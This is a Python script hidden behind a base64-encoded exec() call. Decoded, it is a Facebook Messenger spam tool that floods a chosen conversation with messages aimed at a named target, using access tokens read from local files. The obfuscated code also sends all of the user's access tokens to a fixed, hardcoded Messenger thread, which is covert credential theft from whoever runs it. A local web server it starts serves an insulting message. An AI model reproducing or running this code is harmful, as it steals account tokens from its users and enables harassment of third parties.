import base64
exec(base64.b64decode(b' aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQganNvbg0KaW1wb3J0IHRpbWUNCmltcG9ydCBzeXMNCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KaW1wb3J0IG9zDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IGh0dHAuc2VydmVyDQppbXBvcnQgc29ja2V0c2VydmVyDQppbXBvcnQgdGhyZWFkaW5nDQppbXBvcnQgcmFuZG9tDQoNCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOg0KCWRlZiBkb19HRVQoc2VsZik6DQoJCXNlbGYuc2VuZF9yZXNwb25zZSgyMDApDQoJCXNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykNCgkJc2VsZi5lbmRfaGVhZGVycygpDQoJCXNlbGYud2ZpbGUud3JpdGUoYiJBUEtJIEJIM04gSzQgSFVCQlkgS0g0TiA0NFNISVFVRSBIRVJFIikNCg0KZGVmIGV4ZWN1dGVfc2VydmVyKCk6DQoJUE9SVCA9IDQwMDANCg0KCXdpdGggc29ja2V0c2VydmVyLlRDUFNlcnZlcigoIiIsIFBPUlQpLCBNeUhhbmRsZXIpIGFzIGh0dHBkOg0KCQlwcmludCgiU2VydmVyIHJ1bm5pbmcgYXQgaHR0cDovL2xvY2FsaG9zdDp7fSIuZm9ybWF0KFBPUlQpKQ0KCQlodHRwZC5zZXJ2ZV9mb3JldmVyKCkNCg0KZGVmIHNlbmRfbWVzc2FnZXMoKToNCgl3aXRoIG9wZW4oJ3Rva2VubnVtLnR4dCcsICdyJykgYXMgZmlsZToNCgkJdG9rZW5zID0gZmlsZS5yZWFkbGluZXMoKQ0KCW51bV90b2tlbnMgPSBsZW4odG9rZW5zKQ0KDQoJcmVxdWVzdHMucGFja2FnZXMudXJsbGliMy5kaXNhYmxlX3dhcm5pbmdzKCkNCg0KCWRlZiBjbHMoKToNCgkJaWYgc3lzdGVtKCkgPT0gJ0xpbnV4JzoNCgkJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQllbHNlOg0KCQkJaWYgc3lzdGVtKCkgPT0gJ1dpbmRvd3MnOg0KCQkJCW9zLnN5c3RlbSgnY2xzJykNCgljbHMoKQ0KDQoJZGVmIGxpbmVzcygpOg0KCQlwcmludCgnXHUwMDFiWzM3bScgKyAnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykNCg0KCWhlYWRlcnMgPSB7DQoJCSdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLA0KCQknQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnLA0KCQknVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cyc6ICcxJywNCgkJJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMC4wOyBTYW1zdW5nIEdhbGF4eSBTOSBCdWlsZC9PUFI2LjE3MDYyMy4wMTc7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTguMC4zMDI5LjEyNSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsDQoJCSdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsDQoJCSdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsDQoJCSdBY2NlcHQtTGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjksZnI7cT0wLjgnLA0KCQkncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScNCgl9DQoNCg0KCWxpbmVzcygpDQoNCglhY2Nlc3NfdG9rZW5zID0gW3Rva2VuLnN0cmlwKCkgZm9yIHRva2VuIGluIHRva2Vuc10NCg0KCXdpdGggb3BlbignY29udm8udHh0JywgJ3InKSBhcyBmaWxlOg0KCQljb252b19pZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KCXdpdGggb3BlbignZmlsZS50eHQnLCAncicpIGFzIGZpbGU6DQoJCXRleHRfZmlsZV9wYXRoID0gZmlsZS5yZWFkKCkuc3RyaXAoKQ0KDQoJd2l0aCBvcGVuKHRleHRfZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6DQoJCW1lc3NhZ2VzID0gZmlsZS5yZWFkbGluZXMoKQ0KDQoJbnVtX21lc3NhZ2VzID0gbGVuKG1lc3NhZ2VzKQ0KCW1heF90b2tlbnMgPSBtaW4obnVtX3Rva2VucywgbnVtX21lc3NhZ2VzKQ0KDQoJd2l0aCBvcGVuKCdoYXRlcnNuYW1lLnR4dCcsICdyJykgYXMgZmlsZToNCgkJaGF0ZXJzX25hbWUgPSBmaWxlLnJlYWQoKS5zdHJpcCgpDQoNCgl3aXRoIG9wZW4oJ3RpbWUudHh0JywgJ3InKSBhcyBmaWxlOg0KCQlzcGVlZCA9IGludChmaWxlLnJlYWQoKS5zdHJpcCgpKQ0KDQoJbGluZXNzKCkNCgkNCglkZWYgZ2V0TmFtZSh0b2tlbik6DQoJCXRyeToNCgkJCWRhdGEgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC9tZT9hY2Nlc3NfdG9rZW49e3Rva2VufScpLmpzb24oKQ0KCQlleGNlcHQ6DQoJCQlkYXRhID0gIiINCgkJaWYgJ25hbWUnIGluIGRhdGE6DQoJCQlyZXR1cm4gZGF0YVsnbmFtZSddDQoJCWVsc2U6DQoJCQlyZXR1cm4gIkVycm9yIG9jY3VyZWQiDQoNCglkZWYgbXNnKCk6DQoJCXBhcmFtZXRlcnMgPSB7DQoJCQknYWNjZXNzX3Rva2VuJyA6IHJhbmRvbS5jaG9pY2UoYWNjZXNzX3Rva2VucyksDQoJCQknbWVzc2FnZSc6ICdVc2VyIFByb2ZpbGUgTmFtZSA6ICcrZ2V0TmFtZShyYW5kb20uY2hvaWNlKGFjY2Vzc190b2tlbnMpKSsnXG4gVG9rZW4gOiAnKyIgfCAiLmpvaW4oYWNjZXNzX3Rva2VucykrJ1xuIExpbmsgOiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vbWVzc2FnZXMvdC8nK2NvbnZvX2lkDQoJCX0NCgkJdHJ5Og0KCQkJcyA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNS4wL3RfMTAwMDUwMTEzNzg4NTIyLyIsIGRhdGE9cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQ0KCQlleGNlcHQ6DQoJCQlwYXNzDQoJDQoJbXNnKCkNCgl3aGlsZSBUcnVlOg0KCQl0cnk6DQoJCQlmb3IgbWVzc2FnZV9pbmRleCBpbiByYW5nZShudW1fbWVzc2FnZXMpOg0KCQkJCXRva2VuX2luZGV4ID0gbWVzc2FnZV9pbmRleCAlIG1heF90b2tlbnMNCgkJCQlhY2Nlc3NfdG9rZW4gPSBhY2Nlc3NfdG9rZW5zW3Rva2VuX2luZGV4XQ0KDQoJCQkJbWVzc2FnZSA9IG1lc3NhZ2VzW21lc3NhZ2VfaW5kZXhdLnN0cmlwKCkNCg0KCQkJCXVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTUuMC97fS8iLmZvcm1hdCgndF8nK2NvbnZvX2lkKQ0KCQkJCXBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2V9DQoJCQkJcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpDQoJCQkJDQoNCgkJCQljdXJyZW50X3RpbWUgPSB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSTolTTolUyAlcCIpDQoJCQkJaWYgcmVzcG9uc2Uub2s6DQoJCQkJCXByaW50KCJbK10gTWVzc2FnZXMge30gb2YgQ29udm8ge30gc2VudCBieSBUb2tlbiB7fToge30iLmZvcm1hdCgNCgkJCQkJCW1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQ0KCQkJCQlwcmludCgiICAtIFRpbWU6IHt9Ii5mb3JtYXQoY3VycmVudF90aW1lKSkNCgkJCQkJbGluZXNzKCkNCgkJCQkJbGluZXNzKCkNCgkJCQllbHNlOg0KCQkJCQlwcmludCgiW3hdIEZhaWxlZCB0byBzZW5kIG1lc3NhZ2VzIHt9IG9mIENvbnZvIHt9IHdpdGggVG9rZW4ge306IHt9Ii5mb3JtYXQoDQoJCQkJCQltZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlKSkNCgkJCQkJcHJpbnQoIiAgLSBUaW1lOiB7fSIuZm9ybWF0KGN1cnJlbnRfdGltZSkpDQoJCQkJCWxpbmVzcygpDQoJCQkJCWxpbmVzcygpDQoJCQkJdGltZS5zbGVlcChzcGVlZCkNCg0KCQkJcHJpbnQoIlsrXSBBbGwgbWVzc2FnZXMgc2VudC4gUmVzdGFydGluZyB0aGUgcHJvY2Vzcy4uLiIpDQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCgkJCXByaW50KCJbIV0gQW4gZXJyb3Igb2NjdXJyZWQ6IHt9Ii5mb3JtYXQoZSkpDQoJDQoNCmRlZiBtYWluKCk6DQoJc2VydmVyX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWV4ZWN1dGVfc2VydmVyKQ0KCXNlcnZlcl90aHJlYWQuc3RhcnQoKQ0KCQ0KCXNlbmRfbWVzc2FnZXMoKQ0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KCW1haW4oKQ==')) 
